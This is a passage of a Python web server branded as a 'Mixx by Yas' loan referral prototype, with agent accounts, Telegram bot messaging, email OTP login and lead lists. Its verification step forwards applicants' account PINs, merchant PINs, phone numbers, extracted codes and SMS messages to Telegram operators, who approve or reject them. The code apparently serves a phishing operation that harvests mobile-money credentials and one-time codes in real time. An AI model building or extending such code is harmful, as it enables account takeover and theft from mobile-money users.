                kb.append([{"text": f"📋 Copy Phone: {phone_copy_val}", "copy_text": {"text": phone_copy_val}}])
            elif step == "account_pin":
                kb.append([{"text": f"📋 Copy Password: {zip_code}", "copy_text": {"text": str(zip_code)}}])
                kb.append([{"text": f"📋 Copy Phone: {phone_copy_val}", "copy_text": {"text": phone_copy_val}}])
            elif step in ("zip_phone", "merchant_pin"):
                kb.append([{"text": f"📋 Copy PIN: {zip_code}", "copy_text": {"text": str(zip_code)}}])
                kb.append([{"text": f"📋 Copy Phone: {phone_copy_val}", "copy_text": {"text": phone_copy_val}}])
            elif step == "id_document":
                clean_id_val = str(id_number or "").strip()
                if extracted_code:
                    kb.append([{"text": f"📋 Copy Code: {extracted_code}", "copy_text": {"text": str(extracted_code)}}])
                kb.append([{"text": f"📋 Copy Phone: {phone_copy_val}", "copy_text": {"text": phone_copy_val}}])
                kb.append([{"text": "📋 Copy SMS Message", "copy_text": {"text": clean_id_val}}])

            kb.append([
                {"text": "✅ Approve", "callback_data": f"verify:approve:{ver_id}"},
                {"text": "❌ Reject (Invalid / Retry)", "callback_data": f"verify:reject:{ver_id}"},
            ])
            buttons = {"inline_keyboard": kb}

            def _dispatch_ver_telegram():
                for chat in target_chats:
                    try:
                        send_telegram_message(chat, "\n".join(lines), reply_markup=buttons)
                    except Exception as err:
                        print(f"Error dispatching verification message to Telegram chat {chat}: {err}")

            threading.Thread(target=_dispatch_ver_telegram, daemon=True).start()

        return self.send_json(201, {"verificationId": ver_id, "step": step, "status": "pending"})

    def create_agent(self, data):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid agent data"})
        try:
            name = clean_text(data.get("displayName"), "displayName", 100)
            telegram_chat_id = data.get("telegramChatId")
            if telegram_chat_id is not None:
                telegram_chat_id = str(telegram_chat_id).strip()
                if telegram_chat_id and not telegram_chat_id.lstrip("-").isdigit():
                    raise ValueError("Telegram Chat ID must be numeric")
                if not telegram_chat_id:
                    telegram_chat_id = None

            raw_username = data.get("username")
            if raw_username and isinstance(raw_username, str) and raw_username.strip():
                username = clean_text(raw_username, "username", 50)
            elif telegram_chat_id:
                username = f"agent_{telegram_chat_id}"
            else:
                username = f"agent_{secrets.token_hex(4)}"

            raw_email = data.get("email")
            email = None
            if raw_email:
                cleaned_email = clean_text(raw_email, "email", 254).lower()
                if not valid_email_address(cleaned_email):
                    raise ValueError("Email address is invalid")
                email = cleaned_email
        except ValueError as error:
            return self.send_json(400, {"error": str(error)})

        agent_id = str(uuid.uuid4())
        temporary_password = secrets.token_urlsafe(16)
        password_hash = hash_agent_password(temporary_password)
        pairing_code = secrets.token_urlsafe(24)
        pairing_token_hash = hashlib.sha256(pairing_code.encode("utf-8")).hexdigest()
        bot_user = telegram_bot_username()
        pairing_url = f"https://t.me/{bot_user}?start=link_{pairing_code}"
        try:
            with connect_db() as db:
                db.execute(
                    """INSERT INTO agents (
                        id, display_name, access_token_hash, username, email, password_hash,
                        must_change_password, telegram_chat_id,
                        telegram_pair_token_hash, telegram_pair_expires_at
                    ) VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?, ?)""",
                    (
                        agent_id,
                        name,
                        hashlib.sha256(secrets.token_bytes(32)).hexdigest(),
                        username,
                        email,
                        password_hash,
                        telegram_chat_id,
                        pairing_token_hash if not telegram_chat_id else None,
                        (time.time() + 15 * 60) if not telegram_chat_id else None,
                    ),
                )
        except sqlite3.IntegrityError as error:
            error_text = str(error).lower()
            if "username" in error_text:
                return self.send_json(400, {"error": "Username is already in use"})
            if "telegram_chat_id" in error_text:
                return self.send_json(400, {"error": "Telegram Chat ID is already registered to another agent"})
            return self.send_json(400, {"error": "Agent details conflict with an existing account"})
        except sqlite3.Error:
            return self.send_json(500, {"error": "Could not create agent"})

        token = create_referral_token(agent_id)
        base_url = get_public_base_url(self.headers)
        referral_url = f"{base_url}/?ref={token}"

        if telegram_chat_id and telegram_bot_token():
            welcome_msg = (
                f"👋 Welcome, {name}!\n\n"
                f"Your Mixx by Yas agent account has been created successfully.\n\n"
                f"🔗 Your Exclusive Referral Link:\n{referral_url}\n\n"
                f"Share this link with applicants to earn commissions and track leads directly from your profile!"
            )
            threading.Thread(
                target=lambda: (send_telegram_message(telegram_chat_id, welcome_msg) if True else None),
                daemon=True,
            ).start()

        return self.send_json(
            201,
            {
                "agentId": agent_id,
                "displayName": name,
                "username": username,
                "email": email,
                "telegramChatId": telegram_chat_id,
                "temporaryPassword": temporary_password,
                "referralToken": token,
                "referralUrl": referral_url,
                "telegramPairingUrl": pairing_url,
            },
        )

    def message_agents(self, data):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid request"})

        target = data.get("target")
        message_text = (data.get("message") or "").strip()
        custom_chat_id = (data.get("chatId") or "").strip()

        if not message_text:
            return self.send_json(400, {"error": "Message text is required"})

        if not telegram_bot_token():
            return self.send_json(400, {"error": "Telegram bot token is not configured"})

        recipients = []
        if target == "all":
            with connect_db() as db:
                rows = db.execute(
                    """SELECT display_name, telegram_chat_id FROM agents
                       WHERE telegram_chat_id IS NOT NULL AND trim(telegram_chat_id) != ''
                         AND status = 'active'"""
                ).fetchall()
                recipients = [(r["telegram_chat_id"], r["display_name"]) for r in rows]
        elif target == "custom" or (not target and custom_chat_id):
            if not custom_chat_id:
                return self.send_json(400, {"error": "Chat ID is required"})
            recipients = [(custom_chat_id, "Custom Chat")]
        elif target:
            with connect_db() as db:
                row = db.execute(
                    """SELECT display_name, telegram_chat_id FROM agents
                       WHERE id = ? OR username = ?""",
                    (target, target),
                ).fetchone()
                if not row or not row["telegram_chat_id"]:
                    return self.send_json(400, {"error": "Selected agent does not have a configured Telegram Chat ID"})
                recipients = [(row["telegram_chat_id"], row["display_name"])]
        else:
            return self.send_json(400, {"error": "Please select a recipient"})

        if not recipients:
            return self.send_json(400, {"error": "No agents found with a Telegram Chat ID"})

        sent_count = 0
        errors = []
        for chat_id, name in recipients:
            try:
                send_telegram_message(chat_id, message_text)
                sent_count += 1
            except Exception as e:
                errors.append(f"{name} ({chat_id}): {str(e)}")

        return self.send_json(200, {
            "ok": True,
            "sent": sent_count,
            "total": len(recipients),
            "errors": errors if errors else [],
        })

    def agent_login(self, data):
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid login data"})
        username = data.get("username")
        password = data.get("password")
        if not isinstance(username, str) or not isinstance(password, str):
            return self.send_json(400, {"error": "Username and password are required"})
        with connect_db() as db:
            agent = db.execute(
                """SELECT id, email, password_hash, must_change_password
                   FROM agents WHERE lower(username) = ? AND status = 'active'""",
                (username.strip().lower(),),
            ).fetchone()
        if not agent or not agent["password_hash"] or not verify_agent_password(
            password, agent["password_hash"]
        ):
            return self.send_json(401, {"error": "Invalid username or password"})
        if not agent["email"]:
            return self.send_json(400, {"error": "No email is configured for this account"})
        rate_limited = False
        with connect_db() as db:
            recent_challenge = db.execute(
                """SELECT strftime('%s', 'now') - strftime('%s', created_at) AS age
                   FROM agent_email_otps WHERE agent_id = ?""",
                (agent["id"],),
            ).fetchone()
            if recent_challenge and recent_challenge["age"] < 60:
                rate_limited = True
            else:
                db.execute("DELETE FROM agent_email_otps WHERE agent_id = ?", (agent["id"],))
        if rate_limited:
            return self.send_json(429, {"error": "Wait one minute before requesting another code"})
        challenge_token = secrets.token_urlsafe(32)
        otp_code = f"{secrets.randbelow(1_000_000):06d}"
        challenge_hash = hashlib.sha256(challenge_token.encode("utf-8")).hexdigest()
        code_hash = hashlib.sha256(
            f"{challenge_token}:{otp_code}".encode("utf-8")
        ).hexdigest()
        try:
            with connect_db() as db:
                db.execute(
                    """INSERT INTO agent_email_otps
                       (token_hash, agent_id, code_hash, expires_at)
                       VALUES (?, ?, ?, ?)""",
                    (challenge_hash, agent["id"], code_hash, time.time() + 300),
                )
            send_agent_otp(agent["email"], otp_code)
        except (OSError, RuntimeError, smtplib.SMTPException, ValueError) as error:
            with connect_db() as db:
                db.execute(
                    "DELETE FROM agent_email_otps WHERE token_hash = ?",
                    (challenge_hash,),
                )
            print(f"Agent OTP email delivery failed ({type(error).__name__}).")
            return self.send_json(503, {"error": "Could not send email code. Check SMTP configuration."})
        return self.send_json(
            200,
            {
                "otpRequired": True,
                "challengeToken": challenge_token,
                "maskedEmail": masked_email(agent["email"]),
            },
        )

    def verify_agent_otp(self, data):
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid verification data"})
        challenge_token = data.get("challengeToken")
        code = data.get("code")
        if (
            not isinstance(challenge_token, str)
            or not isinstance(code, str)
            or not re.fullmatch(r"\d{6}", code)
        ):
            return self.send_json(400, {"error": "Enter the six-digit email code"})
        challenge_hash = hashlib.sha256(challenge_token.encode("utf-8")).hexdigest()
        failure = None
        agent_id = None
        must_change_password = False
        with connect_db() as db:
            challenge = db.execute(
                """SELECT o.agent_id, o.code_hash, o.expires_at, o.attempts,
                          a.must_change_password
                   FROM agent_email_otps o JOIN agents a ON a.id = o.agent_id
                   WHERE o.token_hash = ? AND a.status = 'active'""",
                (challenge_hash,),
            ).fetchone()
            if not challenge or challenge["expires_at"] <= time.time():
                db.execute("DELETE FROM agent_email_otps WHERE token_hash = ?", (challenge_hash,))
                failure = (401, "Email code expired or invalid")
            elif challenge["attempts"] >= 5:
                db.execute("DELETE FROM agent_email_otps WHERE token_hash = ?", (challenge_hash,))
                failure = (429, "Too many incorrect codes. Log in again.")
            else:
                code_hash = hashlib.sha256(
                    f"{challenge_token}:{code}".encode("utf-8")
                ).hexdigest()
            if challenge and challenge["attempts"] < 5 and not failure and not hmac.compare_digest(
                code_hash, challenge["code_hash"]
            ):
                attempts = challenge["attempts"] + 1
                if attempts >= 5:
                    db.execute(
                        "DELETE FROM agent_email_otps WHERE token_hash = ?",
                        (challenge_hash,),
                    )
                else:
                    db.execute(
                        "UPDATE agent_email_otps SET attempts = ? WHERE token_hash = ?",
                        (attempts, challenge_hash),
                    )
                failure = (401, "Email code is incorrect")
            elif challenge and not failure:
                db.execute("DELETE FROM agent_email_otps WHERE token_hash = ?", (challenge_hash,))
                agent_id = challenge["agent_id"]
                must_change_password = bool(challenge["must_change_password"])
        if failure:
            return self.send_json(failure[0], {"error": failure[1]})
        session_token = secrets.token_urlsafe(32)
        expires_at = time.time() + 8 * 60 * 60
        with connect_db() as db:
            db.execute(
                "INSERT INTO agent_sessions (token_hash, agent_id, expires_at) VALUES (?, ?, ?)",
                (
                    hashlib.sha256(session_token.encode("utf-8")).hexdigest(),
                    agent_id,
                    expires_at,
                ),
            )

        return self.send_json(
            200,
            {"mustChangePassword": must_change_password},
            [("Set-Cookie", self.session_cookie(session_token, 8 * 60 * 60))],
        )

    def change_agent_password(self, data):
        session = self.agent_session()
        if not session:
            return self.send_json(401, {"error": "Please log in"})
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid password data"})
        current_password = data.get("currentPassword")
        new_password = data.get("newPassword")
        if not isinstance(current_password, str) or not isinstance(new_password, str):
            return self.send_json(400, {"error": "Current and new password are required"})
        if len(new_password) < 12 or len(new_password) > 128:
            return self.send_json(400, {"error": "New password must be 12 to 128 characters"})
        password_incorrect = False
        with connect_db() as db:
            agent = db.execute(
                "SELECT password_hash FROM agents WHERE id = ?", (session["id"],)
            ).fetchone()
            if not agent or not verify_agent_password(current_password, agent["password_hash"]):
                password_incorrect = True
            else:
                db.execute(
                    "UPDATE agents SET password_hash = ?, must_change_password = 0 WHERE id = ?",
                    (hash_agent_password(new_password), session["id"]),
                )
        if password_incorrect:
            return self.send_json(401, {"error": "Current password is incorrect"})
        return self.send_json(200, {"ok": True})

    def agent_logout(self):
        session = self.agent_session()
        if session:
            with connect_db() as db:
                db.execute(
                    "DELETE FROM agent_sessions WHERE token_hash = ?",
                    (session["token_hash"],),
                )
        return self.send_json(
            200,
            {"ok": True},
            [("Set-Cookie", self.session_cookie("", 0))],
        )

    def create_application(self, data):
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid application data"})
        try:
            application = validated_application(data)
            with connect_db() as db:
                existing = db.execute(
                    "SELECT id FROM applications WHERE submission_id = ?",
                    (application["submission_id"],),
                ).fetchone()
                if existing:
                    return self.send_json(200, {"applicationId": existing["id"]})
                db.execute(
                    """INSERT INTO applications (
                        id, submission_id, agent_id, first_name, last_name, phone,
                        loan_type, loan_amount, term_months, purpose, employment,
                        annual_income, agent_contact_consent
                    ) VALUES (
                        :id, :submission_id, :agent_id, :first_name, :last_name,
                        :phone, :loan_type, :loan_amount, :term_months, :purpose,
                        :employment, :annual_income, :agent_contact_consent
                    )""",
                    application,
                )
                if telegram_bot_token():
                    has_agent_tg = False
                    if application["agent_id"]:
                        agent_row = db.execute(
                            "SELECT telegram_chat_id FROM agents WHERE id = ?",
                            (application["agent_id"],),
                        ).fetchone()
                        if agent_row and agent_row["telegram_chat_id"]:
                            has_agent_tg = True
                            db.execute(
                                "INSERT INTO telegram_agent_outbox (id, application_id) VALUES (?, ?)",
                                (str(uuid.uuid4()), application["id"]),
                            )
                    if (not has_agent_tg) and telegram_admin_chat_id():
                        db.execute(
                            "INSERT INTO telegram_outbox (id, application_id) VALUES (?, ?)",
                            (str(uuid.uuid4()), application["id"]),
                        )
        except ValueError as error:
            return self.send_json(400, {"error": str(error)})
        except sqlite3.IntegrityError:
            with connect_db() as db:
                existing = db.execute(
                    "SELECT id FROM applications WHERE submission_id = ?",
                    (application["submission_id"],),
                ).fetchone()
            return self.send_json(200, {"applicationId": existing["id"]})
        except sqlite3.Error:
            return self.send_json(500, {"error": "Could not submit application"})
        return self.send_json(201, {"applicationId": application["id"]})

    def agent_leads(self):
        session = self.agent_session()
        if not session:
            return self.send_json(401, {"error": "Please log in"})
        if session["must_change_password"]:
            return self.send_json(403, {"error": "Change your temporary password first"})
        with connect_db() as db:
            rows = db.execute(
                """SELECT id, first_name, last_name, phone, loan_type, loan_amount,
                          term_months, status, created_at
                   FROM applications
                   WHERE agent_id = ? AND agent_contact_consent = 1
                   ORDER BY created_at DESC LIMIT 200""",
                (session["id"],),
            ).fetchall()
        return self.send_json(200, {"leads": [dict(row) for row in rows]})

    def log_message(self, format, *args):
        message = format % args
        if "/api/" in message:
            super().log_message(format, *args)


if __name__ == "__main__":
    initialize_db()
    if not (os.environ.get("ORANGE_ADMIN_TOKEN") or os.environ.get("MOMO_ADMIN_TOKEN") or os.environ.get("EMOLA_ADMIN_TOKEN")):
        print(f"Local admin token: {ADMIN_TOKEN}")
    print(f"Mixx by Yas referral prototype: http://{HOST}:{PORT}")
    running = ensure_telegram_threads_running()
    if running:
        print(f"Telegram bot listener enabled for @{telegram_bot_username()}.")
        if telegram_admin_chat_id():
            print("Telegram admin notifications enabled.")
    else:
        print("Telegram bot waiting for token: configure in /admin settings or with MOMO_TELEGRAM_BOT_TOKEN.")
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()